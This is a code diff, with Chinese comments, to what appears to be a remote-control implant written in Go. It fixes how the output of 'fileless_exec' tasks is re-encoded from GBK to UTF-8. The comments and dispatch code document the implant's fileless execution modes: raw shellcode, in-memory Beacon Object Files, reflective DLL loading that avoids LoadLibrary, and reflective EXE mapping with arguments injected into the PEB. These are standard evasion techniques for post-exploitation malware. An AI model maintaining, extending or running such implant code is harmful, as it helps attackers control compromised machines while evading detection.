@@ -1803,9 +1803,12 @@ func executeTask(task Task) Result {
 	}
 
 	// Windows下将输出从GBK转换为UTF-8（file_list/av_detect 除外，它们的输出本身已是 UTF-8）
-	// exec_module 同样排除：模块输出的 UTF-8 文本经 GBK 转换会被打成乱码
-	// （实测"镜像已释放…"这类中文尾注被转坏），而模块输出本来就该是 UTF-8。
-	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" && task.TaskType != "exec_module" {
+	// exec_module / fileless_exec 同样排除：这两条路径的回执里带植入端自己写的中文标注
+	// （exec_module："镜像已释放…"；fileless_exec：退出拦截/输出捕获那几行），
+	// 整体过一遍 GBK→UTF-8 会把 UTF-8 的中文标注打成乱码。
+	// 载荷自己的输出（GBK 控制台程序）由捕获侧按流单独判编码转换（guardDecodeConsole），
+	// BOF 输出则在 handleFilelessExec 里显式转一次，因此这里排除不会造成输出乱码。
+	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" && task.TaskType != "exec_module" && task.TaskType != "fileless_exec" {
 		output = string(gbkToUTF8([]byte(output)))
 	}
 
@@ -1824,7 +1827,13 @@ func executeTask(task Task) Result {
 //   - bof：内存 COFF 执行（Beacon Object File），不落盘；
 //   - dll：反射式 PE 加载（映射 + 重定位 + 导入表修复 + 调 DllMain），不落盘、不走 LoadLibrary(路径)；
 //   - exe_mem：反射式映射 EXE 并 CreateThread 到入口点，args 作为命令行注入 PEB
-//     （要求与植入体同架构；不重定向 stdout，需要输出请用落地执行）。
+//     （要求与植入体同架构；stdout/stderr 会被重定向捕获回传，详见 mexecguard_windows.go）。
+//
+// 编码口径：fileless_exec 已在 executeTask 里排除"整体 GBK→UTF-8"（因为回执带植入端自己
+// 写的 UTF-8 中文标注）。因此这里对 BOF 输出显式补一次 GBK→UTF-8 —— BOF 的
+// BeaconPrintf 输出通常来自 GBK 控制台程序，不补就会在界面上显示乱码；
+// dll/exe_mem 的载荷输出由捕获侧按流判编码处理，shellcode 的回执是英文标注，
+// 都不需要在这里再动。
 func handleFilelessExec(data string) (string, int32, string) {
 	var req struct {
 		Kind       string `json:"kind"`
@@ -1844,7 +1853,11 @@ func handleFilelessExec(data string) (string, int32, string) {
 	case "shellcode", "":
 		return runBlob(req.PayloadB64)
 	case "bof":
-		return loadBOF(req.PayloadB64, req.Args)
+		out, code, errMsg := loadBOF(req.PayloadB64, req.Args)
+		if runtime.GOOS == "windows" && out != "" {
+			out = string(gbkToUTF8([]byte(out)))
+		}
+		return out, code, errMsg
 	case "dll":
 		return loadDLLMem(req.PayloadB64, req.Entry)
 	case "exe_mem":
